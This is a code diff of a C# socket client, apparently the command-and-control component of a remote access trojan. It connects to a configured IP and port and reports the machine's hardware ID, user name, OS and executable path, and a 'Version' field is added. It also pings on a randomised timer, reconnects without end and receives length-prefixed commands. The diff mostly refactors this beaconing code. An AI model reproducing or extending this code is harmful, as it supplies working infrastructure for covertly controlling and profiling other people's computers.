@@ -1,5 +1,4 @@
 ﻿using Client.MessagePack;
-using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
 using System.Diagnostics;
@@ -24,7 +23,6 @@ namespace Client.Sockets
         private static MemoryStream MS { get; set; }
         private static object SendSync { get; set; }
 
-        /// Initialization variables and connect to socket.
         public static void InitializeClient()
         {
             try
@@ -36,7 +34,7 @@ namespace Client.Sockets
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                Client.Connect(Settings.IP, Settings.Port);
+                Client.Connect(Settings.IP, Convert.ToInt32(Settings.Port));
                 Debug.WriteLine("Connected!");
                 Buffer = new byte[1];
                 Buffersize = 0;
@@ -45,7 +43,7 @@ namespace Client.Sockets
                 SendSync = new object();
                 BeginSend(SendInfo());
                 TimerCallback T = CheckServer;
-                Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
+                Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                 Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
@@ -56,10 +54,8 @@ namespace Client.Sockets
             }
         }
 
-        /// Cleanup everything and start to connect again.
         public static void Reconnect()
         {
-            if (Client.Connected) return;
 
             Tick?.Dispose();
 
@@ -75,15 +71,15 @@ namespace Client.Sockets
             InitializeClient();
         }
 
-        /// Method to send our ID to server's listview.
         private static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString() + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft",null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
+            msgpack.ForcePathObject("Version").AsString = Settings.Version;
             return msgpack.Encode2Bytes();
         }
 
@@ -108,25 +104,20 @@ namespace Client.Sockets
             return strResult.ToString().Substring(0, 12).ToUpper();
         }
 
-        /// get the length of the buffer by reading byte by byte [1]
-        /// until we get the full size.
         public static void ReadServertData(IAsyncResult ar)
         {
             try
             {
-                if (Client.Connected == false)
+                if (!Client.Connected)
                 {
                     Reconnect();
                     return;
                 }
 
                 int Recevied = Client.EndReceive(ar);
-
                 if (Recevied > 0)
                 {
-
                     if (BufferRecevied == false)
-                    {
                         if (Buffer[0] == 0)
                         {
                             Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
@@ -140,10 +131,7 @@ namespace Client.Sockets
                             }
                         }
                         else
-                        {
                             MS.Write(Buffer, 0, Buffer.Length);
-                        }
-                    }
                     else
                     {
                         MS.Write(Buffer, 0, Recevied);
@@ -157,47 +145,49 @@ namespace Client.Sockets
                             BufferRecevied = false;
                         }
                         else
-                        {
                             Buffer = new byte[Buffersize - MS.Length];
-                        }
                     }
                     Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
                     Reconnect();
+                    return;
                 }
             }
             catch
             {
                 Reconnect();
+                return;
             }
         }
 
-        /// Send
-        /// adding the buffersize in the beginning of the stream
         public static void BeginSend(byte[] buffer)
         {
             lock (SendSync)
             {
-                if (Client.Connected)
+                if (!Client.Connected)
                 {
-                    try
-                    {
-                        using (MemoryStream MS = new MemoryStream())
-                        {
-                            byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
-                            MS.Write(buffersize, 0, buffersize.Length);
-                            MS.Write(buffer, 0, buffer.Length);
+                    Reconnect();
+                    return;
+                }
 
-                            Client.Poll(-1, SelectMode.SelectWrite);
-                            Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
-                        }
-                    }
-                    catch
+                try
+                {
+                    using (MemoryStream MS = new MemoryStream())
                     {
-                        Reconnect();
+                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
+                        MS.Write(buffersize, 0, buffersize.Length);
+                        MS.Write(buffer, 0, buffer.Length);
+
+                        Client.Poll(-1, SelectMode.SelectWrite);
+                        Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
                     }
+                }
+                catch
+                {
+                    Reconnect();
+                    return;
                 }
             }
         }
@@ -211,6 +201,7 @@ namespace Client.Sockets
             catch
             {
                 Reconnect();
+                return;
             }
         }
 
@@ -219,7 +210,7 @@ namespace Client.Sockets
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
             msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
-            ClientSocket.BeginSend(msgpack.Encode2Bytes());
+            BeginSend(msgpack.Encode2Bytes());
         }
     }
 }
